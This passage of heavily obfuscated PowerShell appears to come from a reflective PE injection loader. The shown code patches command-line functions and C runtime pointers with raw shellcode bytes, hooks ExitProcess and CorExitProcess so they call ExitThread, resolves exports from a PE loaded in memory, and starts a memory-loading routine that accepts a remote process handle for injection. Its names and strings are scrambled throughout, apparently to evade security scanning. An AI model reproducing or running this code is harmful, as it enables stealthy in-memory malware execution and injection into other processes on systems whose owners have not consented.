                Throw ("{7}{6}{10}{3}{0}{5}{4}{9}{1}{2}{8}" -f' memo','o','tecti','o change',' ','ry','bl','Una','on','pr','e t')
            }
        }
    }
    
    
    
    Function uPda`T`E-exE`FuN`CTIONS
    {
        Param(
        [Parameter(poSITion = 0, MAnDAtORY = ${Tr`Ue})]
        [System.Object]
        ${pEI`NFO},
        
        [Parameter(poSItioN = 1, Mandatory = ${tR`Ue})]
        [System.Object]
        ${wi`N32FunC`Tio`NS},
        
        [Parameter(poSitIOn = 2, MaNDATOry = ${Tr`Ue})]
        [System.Object]
        ${WiN`32cO`NSta`NTs},
        
        [Parameter(POSiTiOn = 3, MaNDATorY = ${Tr`UE})]
        [String]
        ${eX`e`ARg`UMeNTS},
        
        [Parameter(posItion = 4, maNDATORy = ${tR`UE})]
        [IntPtr]
        ${E`xedo`NEbyTE`PTr}
        )
        
        
        ${R`eT`URNa`RrAy} = @() 
        
        ${PTr`sIZE} =  (  vArIabLe znDO  -vA  )::"size`oF"([Type][IntPtr])
        [UInt32]${olDp`ROtEc`Tf`lAG} = 0
        
        [IntPtr]${kER`NEl`32hA`NDLe} = ${wiN3`2Fu`N`CTIO`NS}."gE`T`ModULeh`AN`dle"."i`NvoKE"(("{0}{1}{2}" -f 'Ke','r','nel32.dll'))
        if (${ke`RN`eL32`haND`LE} -eq   (VARiabLe  ("peFz"+"6j") -vALUEoN  )::"Ze`RO")
        {
            throw ("{3}{1}{0}{2}"-f 'le ','nel32 hand','null','Ker')
        }
        
        [IntPtr]${kERN`elb`A`S`e`HAndLe} = ${Win3`2FUncti`ONs}."Ge`TMODU`LEHa`NdlE"."IN`Vo`kE"(("{2}{3}{0}{1}{4}"-f'elBase','.d','Ker','n','ll'))
        if (${kEr`N`eLbAsE`H`AnDLE} -eq  $pefZ6J::"Z`ERo")
        {
            throw ("{3}{4}{1}{2}{0}" -f 'ull','Base han','dle n','K','ernel')
        }

        
        
        
        ${cm`d`lIn`EwA`RGsPTr} =   ( gEt-ItEm ('VaRiab'+'le:z'+'nDO') ).vALUE::("{1}{4}{3}{0}{2}{5}"-f 'oHGlobal','Stri','U','T','ng','ni').Invoke(${ex`Earg`UmENTs})
        ${CmDL`inE`A`ARg`sptr} =   $Zndo::("{0}{4}{3}{1}{2}"-f 'St','balAn','si','ToHGlo','ring').Invoke(${E`xea`Rgume`NTS})
    
        [IntPtr]${GETcom`MA`N`DLINEAA`d`dR} = ${W`I`N32FUnC`TIONS}."GETProc`ADdrE`Ss"."invO`ke"(${KErNeLbASE`h`AN`dle}, ("{4}{3}{1}{2}{0}" -f'A','CommandLin','e','t','Ge'))
        [IntPtr]${g`Et`ComMaND`LIN`eW`ADdR} = ${wIN`32fu`NcTIo`Ns}."G`et`pRO`caddr`esS"."inV`OKE"(${k`E`RnElBAs`Eh`ANd`le}, ("{3}{0}{2}{1}" -f 'Co','neW','mmandLi','Get'))

        if (${G`e`TCommA`NDL`in`EAaDDR} -eq   $PefZ6j::"z`Ero" -or ${G`Et`c`OM`MAnDLiNEWaDdr} -eq   (  Gi vARIAble:peFZ6J).vaLuE::"Z`eRo")
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr) "
        }

        
        [Byte[]]${S`HELl`CO`de1} = @()
        if (${P`TR`SiZE} -eq 8)
        {
            ${s`hEl`LCoD`E1} += 0x48 
        }
        ${she`lLc`OdE1} += 0xb8
        
        [Byte[]]${shEl`Lc`ODE2} = @(0xc3)
        ${tO`T`ALs`IZe} = ${she`Ll`c`ODe1}."LenG`Th" + ${pT`R`SIZe} + ${s`hElLCO`DE2}."lEn`gtH"
        
        
        
        ${GetCommaNd`LINeaORig`ByT`e`SpTR} =   (  IteM vaRIAbLe:znDo  ).vaLUe::("{2}{0}{3}{1}"-f'l','HGlobal','Al','oc').Invoke(${To`T`AlSIZE})
        ${GEt`COmmANd`l`I`NeWo`RigbYtEs`Ptr} =  $ZNDo::("{2}{1}{0}" -f'ocHGlobal','ll','A').Invoke(${t`O`TalsIZE})
        ${WIn3`2`Fun`c`TiONs}."memc`Py"."INVo`ke"(${G`EtCOm`MANdli`Nea`OriGb`yTes`ptr}, ${get`ComM`ANdLINeAaD`dr}, [UInt64]${tOtaLS`i`ze}) | &("{1}{0}"-f '-Null','Out')
        ${WIn3`2fUNct`iO`Ns}."mE`mCPY"."I`Nvoke"(${g`ETCoM`maNDl`I`NewORi`gby`TespTr}, ${getco`MmaN`d`L`IneW`AddR}, [UInt64]${TOt`Als`izE}) | &("{0}{1}{2}"-f 'Ou','t-N','ull')
        ${ReT`UrnA`R`Ray} += ,(${g`EtCO`mm`AnD`LINE`AadDR}, ${g`EtComM`AnDLiNEaorig`BYtE`s`PtR}, ${toTAls`i`ZE})
        ${RE`T`URna`RrAy} += ,(${GE`TcOmMaN`DLinEW`ADdr}, ${gETcOmmaNdlINEwo`RI`GBy`TeS`ptr}, ${tOT`AL`sIZe})

        
        [UInt32]${ol`DPR`ote`ctF`LaG} = 0
        ${SUCc`eSs} = ${wiN3`2`F`UNCTi`Ons}."vIRt`Ua`LpR`Ot`ect"."Inv`okE"(${g`e`T`c`oMMANDl`iNeAA`Ddr}, [UInt32]${to`TAlsi`zE}, [UInt32](${wIn32CO`NS`T`ANtS}."pag`E_`Execu`Te`_ReADwr`ItE"), [Ref]${olDPROte`ct`F`lag})
        if (${Succ`Ess} = ${F`ALSe})
        {
            throw ("{4}{5}{1}{2}{3}{0}"-f'led','ect ','f','ai','Call',' to VirtualProt')
        }
        
        ${gEt`CommA`NDlINEAadd`R`TEmp} = ${geTcOMMan`d`LI`N`Eaad`DR}
        &("{0}{2}{4}{1}{3}{6}{5}" -f'Write-By','Me','te','mo','sTo','y','r') -Bytes ${sH`ell`C`OdE1} -MemoryAddress ${G`eTcoM`M`AnD`lInEaAD`DRTEMP}
        ${ge`T`CoMMan`dlinE`AA`dDRTE`mP} = &("{6}{2}{7}{4}{3}{5}{0}{1}" -f 'igne','d','dd-','sUn','gnedIntA','s','A','Si') ${gEtcOmMaNd`L`iNe`AaDdRT`emp} (${s`HELLcOd`E1}."lE`NG`Th")
          ( ls  ("VA"+"RiAbl"+"E:Z"+"NdO") ).vALUE::("{0}{3}{1}{2}"-f 'StructureT','Pt','r','o').Invoke(${C`MDlIn`eaARG`Sp`Tr}, ${ge`T`cOMM`A`NDLI`NeAadDRtE`Mp}, ${fA`lsE})
        ${gETcOMma`N`dl`INeaAd`D`RTeMP} = &("{6}{5}{2}{3}{0}{7}{4}{1}"-f 'edI','gned','-Si','gn','sUnsi','d','Ad','ntA') ${getCOmM`AND`lIne`AaDD`R`TEMP} ${pTRS`Ize}
        &("{0}{2}{1}{3}"-f'Writ','M','e-BytesTo','emory') -Bytes ${sHe`Ll`COde2} -MemoryAddress ${g`eT`COmm`AnD`LiN`E`AaDdrTeMp}
        
        ${wIn3`2f`U`NC`TiOns}."VIrT`U`AlprOTecT"."INv`oKe"(${GETCoMm`A`NdLIN`Eaa`dDR}, [UInt32]${TOt`AL`SiZe}, [UInt32]${ol`DPROteCtf`L`AG}, [Ref]${O`LD`P`RoT`ecTFlAG}) | &("{0}{2}{1}" -f'Out-N','ll','u')
        
        
        
        [UInt32]${olDp`R`ot`ECTf`LaG} = 0
        ${S`UC`CeSs} = ${win`3`2fUNc`T`iOnS}."v`iRtUALprOT`EcT"."IN`VOKe"(${GetC`OMMAndL`in`Ewa`D`DR}, [UInt32]${TOta`ls`I`ZE}, [UInt32](${w`IN32COnS`T`ANTs}."pAgE_EXEc`U`Te_RE`AdW`RitE"), [Ref]${O`L`d`PROTEctF`lag})
        if (${SUC`c`ESS} = ${F`A`lsE})
        {
            throw ("{5}{7}{0}{1}{6}{3}{4}{2}" -f 'tualPr','ote','led','fa','i','Call to V','ct ','ir')
        }
        
        ${GeTc`OMm`And`lINEwA`Dd`Rt`Emp} = ${GET`coMMA`Nd`Li`N`eWadDR}
        &("{2}{1}{0}{3}" -f 'e','rite-BytesToM','W','mory') -Bytes ${S`hEll`codE1} -MemoryAddress ${G`Etco`MM`Andlin`eWadDRtEmp}
        ${G`ETcoMMA`Nd`l`InE`W`AddRTeMP} = &("{0}{3}{6}{4}{5}{2}{1}" -f 'Add','igned','Uns','-Signed','tA','s','In') ${G`e`TcOmmAnD`LIn`Ew`AdDRte`mP} (${s`He`llCOD`e1}."LEN`gTh")
          (gEt-VAriAbLe ZndO -vaLUEOnl  )::("{3}{4}{1}{0}{2}" -f'tureToPt','uc','r','S','tr').Invoke(${Cm`DLI`N`ewa`RGSPtR}, ${Getco`Mm`And`l`IN`ewaDDRT`EMP}, ${Fa`Lse})
        ${getcoM`mAND`LINe`w`ADdr`TEmP} = &("{1}{0}{2}{3}"-f'nedI','Add-Sig','nt','AsUnsigned') ${G`ETc`oMMandliNe`WA`DdRtEmP} ${PTR`sIzE}
        &("{2}{1}{0}{3}" -f 'e-','rit','W','BytesToMemory') -Bytes ${s`heLlC`O`DE2} -MemoryAddress ${GEtCO`mM`ANdLIn`EwAdd`Rte`Mp}
        
        ${WIn`32fUNc`Tio`NS}."vIRTuAL`P`Rotect"."InV`OKE"(${G`etC`O`MmaN`DLIN`E`wAdDr}, [UInt32]${t`OTal`SiZE}, [UInt32]${oldpRo`TEcT`FL`Ag}, [Ref]${O`lDpROtECT`F`L`Ag}) | &("{0}{2}{1}"-f 'Out-N','l','ul')
        
        
        
        
        
        
        
        
        ${DLll`i`sT} = @(("{3}{1}{0}{2}"-f'l','vcr70d.d','l','ms'), ("{2}{0}{1}" -f'cr','71d.dll','msv'), ("{3}{0}{2}{1}"-f'cr80d.','l','dl','msv'), ("{1}{2}{0}" -f'0d.dll','ms','vcr9'), ("{2}{0}{3}{1}" -f'r10','d.dll','msvc','0'), ("{1}{4}{2}{0}{3}" -f '10','ms','1','d.dll','vcr'), ("{3}{2}{0}{1}"-f 'r','70.dll','vc','ms') `
            , ("{0}{2}{3}{1}"-f'msvcr7','l','1','.dl'), ("{1}{0}{2}" -f'r80','msvc','.dll'), ("{2}{1}{0}"-f'dll','vcr90.','ms'), ("{3}{0}{1}{2}"-f 'svcr','100.','dll','m'), ("{0}{2}{1}"-f 'msv','0.dll','cr11'))
        
        foreach (${d`lL} in ${DLL`LI`St})
        {
            [IntPtr]${d`lLHAnd`le} = ${WIN32`F`U`NCt`iOnS}."ge`TmO`du`lEhan`dLe"."IN`VokE"(${D`LL})
            if (${D`LL`H`AnDLE} -ne  $PEFZ6j::"z`ero")
            {
                [IntPtr]${WcM`DLnA`d`Dr} = ${wi`N`32FuNcTI`onS}."g`eTPrOCAD`DreSs"."in`VOke"(${D`llh`AndLE}, ("{0}{1}" -f '_wc','mdln'))
                [IntPtr]${ACMd`LN`AdDR} = ${Win32Fu`N`c`TiOns}."G`e`TprOCaD`Dr`ess"."InVO`Ke"(${Dl`LHA`NDlE}, ("{1}{0}" -f 'acmdln','_'))
                if (${WCM`Dl`N`AdDr} -eq   (GI vaRiABlE:PeFZ6J  ).vAlue::"ZE`RO" -or ${a`cMdL`NAD`dr} -eq   $PeFz6j::"z`ErO")
                {
                    ((("{2}{7}{5}{8}{3}{9}{11}{10}{4}{1}{0}{6}"-f 'r _','dln o','Er','ldn','m','c','acmdln','ror, ','ou','{0}','nd _wc','t fi'))  -f[chAR]39)
                }
                
                ${NeWAc`MDl`NPtr} =   (  VaRiAblE znDo -VAlUeo  )::("{4}{3}{2}{0}{1}{5}" -f'An','s','gToHGlobal','n','Stri','i').Invoke(${eXEa`RGu`mE`NTs})
                ${nEWwC`md`lN`ptR} =  $zndO::("{3}{4}{1}{2}{0}" -f 'lUni','gToH','Globa','Str','in').Invoke(${E`XE`ARG`UMEnts})
                
                
                ${OR`i`GA`CMdL`NPtR} =  (  varIABLE ZNDO  ).VALuE::"Pt`R`TostrU`cTure"(${aCmdlN`Ad`Dr}, [Type][IntPtr])
                ${o`RI`gwc`M`DlNPtR} =   ( cHIlDiTem  ("vAR"+"iaBL"+"e:z"+"nd"+"O")).vALue::"pT`RT`OSTr`UCtU`RE"(${Wc`mDLn`A`DDr}, [Type][IntPtr])
                ${oriGACm`DL`NpTrs`TOrage} =   $zndO::("{0}{2}{1}" -f 'Alloc','Global','H').Invoke(${P`TrS`iZe})
                ${ORIgWC`M`DL`N`Pt`RSto`RaGe} =   ( VAriaBLE  zNDO  ).VaLuE::("{3}{0}{1}{2}" -f 'HGlo','ba','l','Alloc').Invoke(${pt`Rs`IZE})
                  ( get-iTEM ("vArIaBlE"+":"+"zN"+"dO")).ValuE::("{2}{1}{4}{0}{3}"-f'ctureT','tr','S','oPtr','u').Invoke(${O`R`igacMdLnpTr}, ${Or`Ig`AC`m`D`lnpTrS`TOrAgE}, ${FA`LSe})
                 (Dir varIAblE:zNdo  ).VAlue::("{2}{0}{3}{1}"-f 'tureT','Ptr','Struc','o').Invoke(${o`RIg`wcMDL`NpTR}, ${O`RIg`wcm`DLn`Pt`RSTorAgE}, ${f`ALSe})
                ${re`TUrN`ARRAY} += ,(${AcMDLn`A`d`dr}, ${OrigAC`MD`ln`PTrSTO`RagE}, ${PTR`s`izE})
                ${RET`URn`A`Rray} += ,(${w`cm`DlNAddR}, ${Origw`CmdLnp`T`R`St`o`RAgE}, ${ptRsI`ze})
                
                ${SU`CCE`ss} = ${WIn32f`UNc`T`i`OnS}."vIrtUa`l`Pr`OtE`cT"."In`Voke"(${A`c`M`Dlnaddr}, [UInt32]${P`T`RSize}, [UInt32](${Win3`2co`NstanTs}."P`AGE_`exe`c`Ute_RE`ADWRI`Te"), [Ref]${o`Ld`PrOtECt`Fl`AG})
                if (${S`UcCE`ss} = ${fa`L`Se})
                {
                    throw ("{2}{0}{3}{1}{6}{4}{5}" -f 'al','u','C','l to Virt',' fa','iled','alProtect')
                }
                  ( LS ('V'+'aRI'+'a'+'BLE:zNDO')  ).VAlUE::("{4}{0}{1}{2}{3}"-f 'truc','tur','eToPt','r','S').Invoke(${nEWa`cMd`l`Nptr}, ${a`C`MDL`NADDr}, ${FA`LSE})
                ${wiN32fu`NC`TIO`Ns}."vi`R`T`U`ALPRoTEct"."inVo`ke"(${a`Cmd`LNaDDR}, [UInt32]${PT`Rs`IZE}, [UInt32](${OldPR`otE`CtflaG}), [Ref]${oLdP`Ro`TECTf`LaG}) | &("{1}{0}{2}" -f't-','Ou','Null')
                
                ${SUc`ceSs} = ${wIN3`2Fu`Nc`TiO`NS}."VirTU`ALp`R`o`TecT"."i`NVoKe"(${wcmD`l`NaDdR}, [UInt32]${PT`RS`IZE}, [UInt32](${WiN`32co`NStan`TS}."Pa`GE_EXEcutE_RE`Ad`wr`ITE"), [Ref]${Oldpr`OtEC`T`FlAG})
                if (${Su`cceSs} = ${FAl`Se})
                {
                    throw ("{6}{4}{1}{3}{5}{0}{2}"-f ' fa',' to Vir','iled','tualPr','ll','otect','Ca')
                }
                  (  Get-vARIAblE ('ZNd'+'o') ).valuE::("{3}{4}{2}{1}{0}"-f 'ToPtr','ture','ruc','S','t').Invoke(${NEwWc`mD`LN`PtR}, ${w`CMd`Ln`AddR}, ${fA`lse})
                ${WIn3`2Fun`CtIo`NS}."v`IRTUAlProte`ct"."iNv`OkE"(${W`c`m`dLNadDR}, [UInt32]${pt`RsIze}, [UInt32](${o`LDPrOT`eCtFlag}), [Ref]${oLdpr`ot`eCt`FLAG}) | &("{0}{1}{2}" -f 'Out-N','ul','l')
            }
        }
        
        
        
        
        

        ${ReT`U`R`NARray} = @()
        ${Ex`It`FU`NCTI`onS} = @() 
        
        
        [IntPtr]${M`S`C`oreEhanDLe} = ${wiN32FUn`CtiO`NS}."GeTmOdu`le`HAN`DLE"."in`Voke"(("{0}{1}{2}" -f 'msco','ree.','dll'))
        if (${mSCorEeh`A`N`Dle} -eq  $peFZ6j::"Ze`RO")
        {
            throw ("{4}{3}{1}{2}{0}"-f 'ull',' handle',' n','ree','msco')
        }
        [IntPtr]${CorExI`TpRo`cEsS`AdDr} = ${W`IN32fuNcT`iO`Ns}."getPr`Oc`ADdrE`SS"."iNV`oke"(${Ms`cOr`eEHANDle}, ("{1}{3}{0}{2}" -f'ce','C','ss','orExitPro'))
        if (${cO`REX`I`TPrO`CeSSADdR} -eq  (  vArIaBLe  PEfZ6J -vaL)::"z`eRo")
        {
            Throw ("{4}{2}{1}{0}{5}{3}" -f 'dd','ess a','orExitProc','not found','C','ress ')
        }
        ${EX`iTfuNct`iONs} += ${CO`ReXITP`ROceS`SA`dDR}
        
        
        [IntPtr]${E`xIt`proCESsa`DDr} = ${WiN32`FU`NC`TIOns}."g`eTp`ROCa`dDReSS"."IN`Voke"(${kERn`E`L32`H`ANdLe}, ("{2}{0}{1}"-f'xit','Process','E'))
        if (${Ex`I`TPRoces`SAD`DR} -eq  (  variaBle  ('pefZ'+'6J') ).ValuE::"Z`ERo")
        {
            Throw ("{0}{5}{3}{2}{1}{4}" -f'Exi','f','ocess address not ','Pr','ound','t')
        }
        ${Ex`ITFuN`CTIONs} += ${exIT`PrOC`eSSaD`DR}
        
        [UInt32]${o`LdP`Ro`TecTF`lAg} = 0
        foreach (${p`R`OcE`xI`TFuNctionAD`Dr} in ${e`XITfUnc`TIONS})
        {
            ${P`R`oCe`XITfUNC`Tio`NaDD`RTmP} = ${p`R`OCE`XiTf`UnCtIoNAddR}
            
            
            [Byte[]]${S`HE`llCoDE1} = @(0xbb)
            [Byte[]]${SHEl`Lc`oDE2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            
            if (${p`TrS`iZe} -eq 8)
            {
                [Byte[]]${ShE`Ll`c`oDE1} = @(0x48, 0xbb)
                [Byte[]]${S`hellC`OD`e2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]${SHel`L`C`OdE3} = @(0xff, 0xd3)
            ${TOT`A`LSIZe} = ${s`he`LL`CoDE1}."L`EnGTh" + ${ptR`Si`ZE} + ${S`hElL`co`DE2}."l`EngTH" + ${p`TRsI`ZE} + ${sHe`ll`COde3}."Leng`TH"
            
            [IntPtr]${EX`IT`TH`ReA`DaDDR} = ${wiN`32fU`NCTi`oNs}."GETPRo`caD`d`R`EsS"."I`NvOke"(${kErNEl3`2`H`AnDlE}, ("{0}{2}{1}" -f'Ex','tThread','i'))
            if (${eXit`THReAd`ADdr} -eq   $pefz6j::"z`ERO")
            {
                Throw ("{0}{7}{5}{4}{2}{6}{1}{3}"-f 'ExitThread ',' foun','s no','d','res','d','t','ad')
            }

            ${sU`cCEsS} = ${Win3`2`FuN`Ct`IONS}."VI`RTu`ALPro`Tect"."iNV`OKe"(${pR`Oc`EXitFu`NCtiOn`AdDr}, [UInt32]${TO`TA`LsizE}, [UInt32]${wIn3`2Con`Sta`NtS}."PAg`e_ExEcut`E_`REAdwri`Te", [Ref]${Old`Pr`OtECTfLAg})
            if (${s`UCCe`ss} -eq ${f`AL`sE})
            {
                Throw ("{2}{5}{1}{6}{0}{4}{3}" -f' VirtualProtec',' t','C','ed','t fail','all','o')
            }
            
            
            ${e`xi`T`pROCe`s`SORIgByTesp`TR} =  ( variabLe  zndo).ValuE::("{1}{0}{2}{3}"-f'o','All','cHGlo','bal').Invoke(${ToTal`S`I`zE})
            ${wIn32F`UNCt`i`ONs}."m`EmcPy"."iNV`OKe"(${ExiT`PROC`es`soRIgB`y`T`E`spTR}, ${Pr`OC`eX`iTfUn`Ctio`NADDr}, [UInt64]${t`ota`l`SIzE}) | &("{1}{0}{2}"-f'ut-','O','Null')
            ${retu`R`NAr`RAY} += ,(${P`ROCEx`itFUNc`TIO`NadDr}, ${Ex`itpRoc`eSsORi`gby`T`ES`p`TR}, ${toTaL`si`zE})
            
            
            
            &("{1}{2}{0}{3}{4}"-f'BytesT','Wr','ite-','oMe','mory') -Bytes ${S`HEll`co`dE1} -MemoryAddress ${pRocexIt`FU`NCti`onadd`Rtmp}
            ${p`ROc`EXIt`FunCtionaD`d`RT`mp} = &("{6}{4}{5}{1}{2}{0}{3}"-f'e','sUn','sign','d','Int','A','Add-Signed') ${proCeXitFUn`C`T`io`NaddRTMp} (${s`hEl`LCOD`E1}."L`eNG`TH")
             $ZNdO::("{2}{0}{3}{1}{4}" -f 'ructu','eToP','St','r','tr').Invoke(${E`xEdoNE`By`TEptr}, ${PROC`EX`ITFUN`cTIOnaDD`RTMp}, ${f`A`lse})
            ${proC`exItFUnctI`ON`ADd`Rt`Mp} = &("{4}{3}{5}{0}{2}{1}" -f'Unsi','ed','gn','igne','Add-S','dIntAs') ${Pro`CExItFUn`CT`IONADd`RTMp} ${PT`R`sIZe}
            &("{2}{3}{4}{5}{6}{0}{1}" -f'oMemo','ry','Writ','e-B','yt','es','T') -Bytes ${S`HE`llcO`dE2} -MemoryAddress ${pRo`ceXi`T`FU`N`ctIoNaDD`RTmp}
            ${pro`cExItFU`NcTiO`NadD`Rt`MP} = &("{3}{2}{0}{4}{1}" -f 'nedIn','ed','d-Sig','Ad','tAsUnsign') ${PROCeXitFUnct`i`ONAD`dRt`mp} (${s`HeLlCO`dE2}."Len`GTH")
             ( gi  VARiAbLe:ZNdO  ).VaLue::("{0}{1}{2}{3}" -f 'St','ru','ctureTo','Ptr').Invoke(${e`xITtHreAdA`d`dR}, ${proCExi`TfUNC`T`I`ONa`DdRTMP}, ${fA`l`se})
            ${PRO`C`e`X`iT`FUNCtIOnADdrt`MP} = &("{1}{4}{3}{0}{6}{5}{2}"-f 'AsUnsi','Add-S','d','t','ignedIn','ne','g') ${PR`O`ce`xitfunC`TiONADDr`TMP} ${p`TRsi`zE}
            &("{4}{1}{3}{0}{2}"-f'sToMemo','rite-B','ry','yte','W') -Bytes ${SH`eLl`c`OdE3} -MemoryAddress ${PrOC`E`XItFun`Ct`Ionad`dRTmp}

            ${W`IN32FUnCtI`o`Ns}."viRt`U`A`L`PrOteCT"."i`N`Voke"(${proC`e`XIT`FUNCtiO`Nad`dR}, [UInt32]${tOt`ALs`izE}, [UInt32]${O`lD`PRO`TE`CTFlag}, [Ref]${OLdPr`OT`EcTf`LAG}) | &("{1}{0}"-f'll','Out-Nu')
        }
        

        &("{1}{2}{0}" -f't','Write-O','utpu') ${re`TUrN`Ar`RaY}
    }
    
    
    
    
    Function copY-`ArR`AyoF`meMAdD`REsSes
    {
        Param(
        [Parameter(pOsitioN = 0, manDatORy = ${T`RuE})]
        [Array[]]
        ${Co`pYI`NFO},
        
        [Parameter(pOSItIOn = 1, MaNdaTORY = ${tR`UE})]
        [System.Object]
        ${wI`N32f`Un`CtiO`Ns},
        
        [Parameter(posiTIon = 2, mANDatOrY = ${t`RUe})]
        [System.Object]
        ${W`I`N`32`coNsTANtS}
        )

        [UInt32]${ol`dP`RO`TeCtfL`Ag} = 0
        foreach (${i`NFo} in ${copyi`NFo})
        {
            ${s`UCceSs} = ${wiN`32FuNc`Ti`ons}."virTua`Lprot`e`cT"."i`NvOKE"(${i`NfO}[0], [UInt32]${iN`FO}[2], [UInt32]${wi`N32`cONs`TA`NTS}."pAG`e_`eXEcUte_`Re`AdwRIte", [Ref]${OLD`P`ROT`EctFlaG})
            if (${SUc`Ce`Ss} -eq ${fa`LSE})
            {
                Throw ("{5}{4}{1}{3}{2}{0}" -f'led','lProtec','fai','t ','all to Virtua','C')
            }
            
            ${W`i`N32Fun`C`TiOnS}."mEmC`Py"."IN`VO`Ke"(${i`Nfo}[0], ${I`Nfo}[1], [UInt64]${i`NFO}[2]) | &("{0}{2}{1}"-f 'O','Null','ut-')
            
            ${WI`N32fuN`CT`iOnS}."viRT`UalPr`O`Tect"."in`VoKE"(${in`FO}[0], [UInt32]${i`Nfo}[2], [UInt32]${Oldp`R`O`TeCtFlag}, [Ref]${o`Ldpr`otE`CtF`lAg}) | &("{0}{1}{2}" -f 'Out','-Nu','ll')
        }
    }


    
    
    
    Function GET-MEm`OryP`RoCadDRe`ss
    {
        Param(
        [Parameter(pOsiTion = 0, maNdaTory = ${Tr`UE})]
        [IntPtr]
        ${Pe`HaNdLE},
        
        [Parameter(PoSItiOn = 1, mandaTOry = ${T`RUE})]
        [String]
        ${FUN`cTIoN`NA`me}
        )
        
        ${wIn`32tY`pES} = &("{3}{2}{0}{1}{4}" -f'32','T','et-Win','G','ypes')
        ${W`In32cons`TAn`TS} = &("{3}{4}{1}{2}{5}{0}" -f'tants','Win','32C','Get','-','ons')
        ${PeIN`Fo} = &("{2}{1}{3}{0}"-f 'tailedInfo','P','Get-','EDe') -PEHandle ${peH`An`DLE} -Win32Types ${wIn`32`TYpeS} -Win32Constants ${Wi`N3`2coNsTA`NTs}
        
        
        if (${P`ei`NfO}."IMAGE`_nT_`H`EaDERs"."Op`TIoNal`h`Eader"."ex`PoRTTA`B`Le"."sI`ze" -eq 0)
        {
            return  (Dir vaRIABLE:PefZ6j).vaLUe::"zE`RO"
        }
        ${expoR`TtA`BLEpTR} = &("{2}{4}{1}{0}{6}{5}{3}" -f 'dIn','e','Ad','ed','d-Sign','Unsign','tAs') (${peHAnD`Le}) (${pEIn`FO}."IM`AgE`_Nt_HE`AdE`RS"."Op`TIOnALheaD`ER"."EXp`oRtTA`BLE"."VIR`TuALA`ddr`E`Ss")
        ${eXpOr`TTa`B`le} =  ( gET-ChIlDiteM  vaRiaBLe:Zndo).vALue::"P`TRtostr`U`cT`UrE"(${exportta`BLEp`Tr}, [Type]${WI`N`32Ty`pEs}."IMa`Ge`_`ExpOr`T_dI`REC`Tory")
        
        for (${I} = 0; ${I} -lt ${E`xpOR`TtabLe}."n`UmBeR`OfNames"; ${I}++)
        {
            
            ${Nameo`F`F`s`etPtr} = &("{0}{3}{1}{5}{4}{2}" -f'Add-Sig','ed','sUnsigned','n','A','Int') (${P`EhaNDle}) (${eXp`oRt`TA`BlE}."A`dDRE`s`SOFNaMES" + (${I} *  $ZNDO::"SiZE`Of"([Type][UInt32])))
            ${N`AM`EPtR} = &("{4}{1}{3}{2}{0}"-f'ned','d-Si','nsig','gnedIntAsU','Ad') (${PE`h`And`le}) (  ( GET-ChilDiTeM ('V'+'ARI'+'A'+'BLe:znDo')  ).vaLuE::"p`Tr`TOStrUCT`U`RE"(${n`AmE`of`FsETPtr}, [Type][UInt32]))
            ${n`AME} =   ( gET-VarIablE zNDO -vALUeOn)::("{4}{2}{3}{1}{0}" -f'ingAnsi','Str','rT','o','Pt').Invoke(${n`Amep`TR})

            if (${Na`mE} -ceq ${fU`NCtIoNN`A`ME})
            {
                
                
                ${Or`DiN`A`LpTr} = &("{3}{1}{6}{2}{4}{0}{5}" -f 'gn','dd-S','Un','A','si','ed','ignedIntAs') (${PEH`ANdle}) (${EXp`Or`TTAbLE}."a`dd`REsso`FnameorDi`N`AlS" + (${i} *   (  DIR vaRIABle:zndO  ).vAlUE::"SIze`oF"([Type][UInt16])))
                ${F`UnciN`DEx} =   $zNDo::"pTRT`OStrU`C`TUrE"(${oRDI`NAL`PTr}, [Type][UInt16])
                ${F`UNCoF`Fse`T`AddR} = &("{2}{5}{3}{1}{6}{4}{0}" -f'gned','n','Ad','SignedI','i','d-','tAsUns') (${PE`h`A`NDLE}) (${Ex`PORtt`Ab`LE}."A`ddRe`ss`ofFuNCtIOns" + (${f`U`Nc`INdEx} *   (  vAriAblE ZnDo -vA )::"s`IZ`EOf"([Type][UInt32])))
                ${fUncO`FFs`ET} =   $zNdO::"pt`Rto`StRu`CTuRE"(${f`U`NcO`FfsetA`DDr}, [Type][UInt32])
                return &("{6}{3}{1}{0}{5}{4}{2}" -f 'd','igne','nsigned','-S','sU','IntA','Add') (${P`e`ha`NdLe}) (${FuNCO`FFS`ET})
            }
        }
        
        return   $PEfZ6J::"ZE`Ro"
    }


    Function Inv`O`ke-mEmOry`lO`ADLiBRaRy
    {
        Param(
        [Parameter( PosItioN = 0, MAndaTOry = ${t`RUE} )]
        [Byte[]]
        ${peb`yT`ES},
        
        [Parameter(pOSiTion = 1, MAndaToRY = ${F`A`LsE})]
        [String]
        ${E`x`eArGS},
        
        [Parameter(POsiTIoN = 2, mandAtORY = ${faL`se})]
        [IntPtr]
        ${r`em`OtePrOc`hA`NDle},

        [Parameter(pOSiTIon = 3)]
        [Bool]
        ${fo`RcEA`sLR} = ${F`A`LSE}
        )
        
        ${PTR`si`zE} =   ( GEt-VariAble  znDo  -vaL)::"Siz`EoF"([Type][IntPtr])
        
        
        ${wI`N`32`C`ONStANts} = &("{0}{3}{2}{1}" -f'Get-Win3','nstants','o','2C')
        ${wIN`32`FuNCtIo`Ns} = &("{2}{0}{1}{3}" -f '32Functi','o','Get-Win','ns')
        ${W`IN32TYp`Es} = &("{3}{2}{1}{4}{0}" -f'ypes','Wi','et-','G','n32T')
        
        ${REm`oteL`oadI`Ng} = ${fa`lse}
        if ((${R`emo`TEpROcha`NDle} -ne ${nU`LL}) -and (${rEMOtePR`OcHa`N`dle} -ne  (  LS  vArIAblE:pefZ6j ).VALuE::"Ze`Ro"))
        {
            ${re`m`ot`elOaDi`NG} = ${t`RuE}
        }
        
        
        &("{0}{1}{2}"-f 'Write-','Verb','ose') ("{4}{5}{3}{2}{6}{0}{1}"-f 'tion from the f','ile','s',' ba','Getti','ng','ic PE informa')
        ${pe`in`Fo} = &("{4}{1}{3}{0}{2}"-f'nf','Bas','o','icI','Get-PE') -PEBytes ${PEbY`T`eS} -Win32Types ${wi`N32tYp`ES}
        ${ORIGInal`imAGe`B`ASe} = ${pEiN`FO}."OR`IGiNA`L`IM`AGebASe"
        ${NxCOMp`A`TI`BLe} = ${T`Rue}
